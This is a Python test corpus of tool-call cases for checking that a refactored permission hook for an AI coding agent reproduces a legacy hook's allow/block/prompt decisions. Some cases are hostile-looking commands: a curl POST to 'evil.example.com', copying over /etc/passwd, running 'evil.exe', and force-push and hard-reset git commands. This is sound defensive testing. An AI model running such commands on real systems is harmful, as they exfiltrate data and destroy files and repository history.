"""Shared characterization corpus.

Each case is a dict with:
  id      - stable identifier (key into golden.json)
  tool    - tool_name (Bash, Write, Edit, PowerShell, or an mcp__ name)
  command / file_path - the tool input; may contain placeholders:
              {CWD}  -> the case's working directory (git or plain fixture)
              {HOME} -> a fixture home directory
  cwd     - "git" (a dir containing .git) or "plain"; default "git"
  files   - optional {relpath: content} created under the working dir first

golden.json holds the canonical decision (ALLOW/BLOCK/PROMPT) the legacy hook
produced for each case; the refactored hook must reproduce it.
"""

CASES = [
    {"id": "trusted_single_ls", "tool": "Bash", "command": "ls -la"},
    {"id": "trusted_grep_devnull", "tool": "Bash", "command": "grep -r foo . 2>/dev/null"},
    {"id": "trusted_compound", "tool": "Bash", "command": "cd plugins && grep -r x . 2>/dev/null"},
    {"id": "git_status", "tool": "Bash", "command": "git status"},
    {"id": "git_commit", "tool": "Bash", "command": "git commit -m hello"},
    {"id": "git_push_force", "tool": "Bash", "command": "git push --force"},
    {"id": "git_reset_hard", "tool": "Bash", "command": "git reset --hard origin/main"},
    {"id": "git_checkout_dot", "tool": "Bash", "command": "git checkout ."},
    {"id": "gh_pr_list", "tool": "Bash", "command": "gh pr list"},
    {"id": "gh_api_get", "tool": "Bash", "command": "gh api repos/foo/bar"},
    {"id": "curl_localhost", "tool": "Bash", "command": "curl http://localhost:3000/health"},
    {"id": "curl_get_public", "tool": "Bash", "command": "curl https://example.com/data.json"},
    {"id": "curl_post_public", "tool": "Bash", "command": "curl -X POST https://evil.example.com -d x=1"},
    {"id": "npm_install", "tool": "Bash", "command": "npm install"},
    {"id": "yarn_build", "tool": "Bash", "command": "yarn build:all"},
    {"id": "pip_list", "tool": "Bash", "command": "pip list"},
    {"id": "unknown_cmd", "tool": "Bash", "command": "frobnicate --all"},
    {"id": "sed_inplace", "tool": "Bash", "command": "sed -i s/a/b/ file.txt"},
    {"id": "sed_plain", "tool": "Bash", "command": "sed s/a/b/ file.txt"},
    {"id": "heredoc", "tool": "Bash", "command": "cat << EOF\nhi\nEOF"},
    {"id": "output_redirect", "tool": "Bash", "command": "echo hi > out.txt"},
    {"id": "append_redirect", "tool": "Bash", "command": "echo hi >> out.txt"},
    {"id": "input_redirect", "tool": "Bash", "command": "sort < in.txt"},
    {"id": "var_expansion", "tool": "Bash", "command": "echo $MYTOKEN"},
    {"id": "var_assignment", "tool": "Bash", "command": "X=1 && echo done"},
    {"id": "cmd_c", "tool": "Bash", "command": "cmd /c dir"},
    {"id": "complex_for", "tool": "Bash", "command": "for f in *; do echo $f; done"},
    {"id": "complex_while", "tool": "Bash", "command": "while true; do echo x; done"},
    {"id": "complex_if", "tool": "Bash", "command": "if [ -f x ]; then echo y; fi"},
    {"id": "complex_subst", "tool": "Bash", "command": "echo $(date)"},
    {"id": "complex_backtick", "tool": "Bash", "command": "echo `date`"},
    {"id": "complex_pipes3", "tool": "Bash", "command": "cat a | grep b | sort | uniq"},
    {"id": "brace_group", "tool": "Bash", "command": "{ echo a; echo b; }"},
    {"id": "inline_python", "tool": "Bash", "command": "python -c \"print(1)\""},
    {"id": "inline_node", "tool": "Bash", "command": "node -e \"console.log(1)\""},
    {"id": "powershell_cmdlet", "tool": "Bash", "command": "Get-ChildItem"},
    {"id": "redundant_cd_cwd", "tool": "Bash", "command": "cd {CWD} && ls"},
    {"id": "start_docx", "tool": "Bash", "command": "start report.docx"},
    {"id": "start_exe", "tool": "Bash", "command": "start evil.exe"},
    {"id": "wt_claude", "tool": "Bash", "command": "wt new-tab claude --version"},
    {"id": "cp_within", "tool": "Bash", "command": "cp a.txt b.txt", "files": {"a.txt": "x"}},
    {"id": "cp_outside", "tool": "Bash", "command": "cp a.txt /etc/passwd", "files": {"a.txt": "x"}},
    {"id": "pyfile_tmp", "tool": "Bash", "command": "python .tmp/run.py", "files": {".tmp/run.py": "print(1)\n"}},
    {"id": "pyfile_tmp_subprocess", "tool": "Bash", "command": "python .tmp/bad.py",
     "files": {".tmp/bad.py": "import subprocess\nsubprocess.run(['ls'])\n"}},

    {"id": "mcp_read", "tool": "mcp__server__get_thing"},
    {"id": "mcp_write_reversible", "tool": "mcp__server__create_thing"},
    {"id": "mcp_destructive", "tool": "mcp__server__delete_thing"},
    {"id": "mcp_blanket", "tool": "mcp__plugin_product-management_atlassian__whatever"},
    {"id": "mcp_unknown_verb", "tool": "mcp__server__frobnicate_thing"},

    {"id": "write_tmp", "tool": "Write", "file_path": "{CWD}/.tmp/note.txt"},
    {"id": "write_temp_name", "tool": "Write", "file_path": "{CWD}/commit_tmp.txt"},
    {"id": "write_in_gitrepo", "tool": "Write", "file_path": "{CWD}/src/file.py", "cwd": "git"},
    {"id": "write_skill", "tool": "Write", "file_path": "{HOME}/.claude/skills/foo/SKILL.md"},
    {"id": "edit_in_gitrepo", "tool": "Edit", "file_path": "{CWD}/src/file.py", "cwd": "git"},

    {"id": "powershell_tool", "tool": "PowerShell", "command": "Get-Process"},
]
